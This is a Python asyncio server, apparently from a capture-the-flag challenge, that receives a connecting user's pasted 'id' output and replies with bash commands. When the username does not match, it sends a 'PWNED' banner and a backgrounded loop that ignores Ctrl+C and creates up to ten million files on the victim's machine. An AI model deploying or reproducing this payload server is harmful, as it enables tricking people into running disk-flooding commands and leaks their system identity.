import re
import asyncio

SKELETON = """
============ PWNED BY 5up3r_U53r_2004 ============
     .... NO! ...                  ... MNO! ...
   ..... MNO!! ...................... MNNOO! ...
 ..... MMNO! ......................... MNNOO!! .
.... MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!! .
 ... !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO! ....
    ...... ! MMMMMMMMMMMMMPPPPOOOOIII! ! ...
   ........ MMMMMMMMMMMMPPPPPOOOOOOII!! .....
   ........ MMMMMOOOOOOPPPPPPPPOOOOMII! ...  
    ....... MMMMM..    OPPMMP    .,OMI! ....
     ...... MMMM::   o.,OPMP,.o   ::I!! ...
         .... NNM:::.,,OOPM!P,.::::!! ....
          .. MMNNNNNOOOOPMO!!IIPPO!!O! .....
         ... MMMMMNNNNOO:!!:!!IPPPPOO! ....
           .. MMMMMNNOOMMNNIIIPPPOO!! ......
          ...... MMMONNMMNNNIIIOO!..........
       ....... MN MOMMMNNNIIIIIO! OO ..........
    ......... MNO! IiiiiiiiiiiiI OOOO ...........
  ...... NNN.MNO! . O!!!!!!!!!O . OONO NO! ........
   .... MNNNNNO! ...OOOOOOOOOOO .  MMNNON!........
   ...... MNNNNO! .. PPPPPPPPP .. MMNON!........
      ...... OO! ................. ON! .......
         ................................
===================================================
"""

FLAG = "li2CTF{4lw4y5_ch3ck_wh47_u_CTRL+C_and_CTRL+V_70_ur_73rm1n4l!}"
right_name = "5up3r_U53r_2004"

names_in_id_re = r"(?<=\()[^ ,]*(?=\))"
etc_passwd_re = r"[^:]*:x:[^:]*:[^:]*:[^:]*:[^:]*:[^:]*"

HOST, PORT = '0.0.0.0', 21006


def transform_text_to_bash(text: str) -> str:
    lines = text.split("\n")
    for i in range(len(lines)):
        lines[i] = f"echo \"{lines[i]}\";"
    return " ".join(lines)


class GrabberServer(asyncio.Protocol):
    def __init__(self):
        self.loop = asyncio.get_running_loop()
        self.working = True

    def set_timer(self, time):
        if hasattr(self, "timeout_handle"):
            self.timeout_handle.cancel()
        self.timeout_handle = self.loop.call_later(
            time, self._timeout,
        )

    def connection_made(self, transport):
        self.peername = transport.get_extra_info('peername')
        print(f"[.] Connected: {self.peername}")
        self.transport = transport
        self.set_timer(5)

    def data_received(self, data):
        if not self.working:
            return
        data = data.decode().strip()
        self.parse_leak(data)
        self.transport.close()
    
    def parse_leak(self, data):
        if not self.working:
            return
        data_lines = data.split("\n")
        name = None
        try:
            raw_id = data_lines[0]
            names = re.findall(names_in_id_re, raw_id)
            name = names[0]
            assert len(names) > 0
        except:
            self.transport.write("GTFO, not ur business".encode("ascii"))
            return
        print(f"[*] Attacked {self.peername}")
        if right_name not in names:
            text = transform_text_to_bash(f"""
{SKELETON}
WELL, {name} != {right_name}.
LMAO U GOT PWNED. NOW I WILL HAVE SOME FUN ON UR PC.
NEVER RUN STRANGE COMMANDS ANYMORE.
NOW GO AND READ THE SHIT YOU HAVE PASTED TO TERMINAL HAHAHA.""")
            
            text += """
trap '' 2
(for i in {1..10000000};
do
    touch "PWNED${i}";
    echo "PWNED BY 5up3r_U53r_2004";
    sleep 1;
done; ) &
            """
            self.transport.write(text.encode("ascii"))
        else:
            self.transport.write(transform_text_to_bash(f"WELL, {right_name} == {right_name}.\n{FLAG}\n").encode("ascii"))
    
    def connection_lost(self, exc=None):
        if not self.working:
            return
        try:
            self.dialog_typer.cancel()
        except AttributeError:
            pass
        self.transport.close()
        print(f"[.] Aborted connection: {self.peername}")

    def _timeout(self):
        if not self.working:
            return
        if self.transport.is_closing():
            return
        print(f"[!] Timed out connection: {self.peername}")
        self.transport.close()
    
    def terminate(self, s):
        if not self.working:
            return
        self.working = False
        self.transport.write(f"\n{s}\n".encode())
        self.transport.close()


async def main(host, port):
    loop = asyncio.get_running_loop()
    server = await loop.create_server(GrabberServer, host, port)
    print(f"[*] Server is running!")
    await server.serve_forever()


if __name__ == "__main__":
    asyncio.run(main(HOST, PORT))
